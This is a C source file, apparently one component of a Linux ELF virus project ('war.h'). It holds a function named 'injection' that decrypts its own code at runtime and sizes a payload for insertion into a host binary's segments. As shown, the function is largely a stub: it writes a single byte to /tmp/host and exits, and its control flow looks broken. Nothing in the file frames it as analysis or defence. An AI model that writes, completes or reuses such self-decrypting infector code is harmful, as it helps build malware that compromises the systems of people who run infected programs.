#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void injection(struct s_host *host, struct s_keychain *keychain)
{
	decrypt_left(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);

	char *ptr;
	int fd = 0;

	const size_t payload_size = PAYLOAD_SIZE + (host->note->self->p_offset - (host->note->data->p_offset + host->note->data->p_filesz));
	const size_t filesize = host->filesize + payload_size;

	if ((fd = open("/tmp/host", O_RDWR | O_TRUNC)) < 0)
		goto label_error;
	if ((ptr = mmap(NULL, filesize, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
		goto label_error;

	*ptr = '*';

	write(fd, ptr, 1);
	close(fd);
	munmap(ptr, filesize);

	__exit(host, keychain);

label_error:
	printf("error\n");
	exit(1);
}
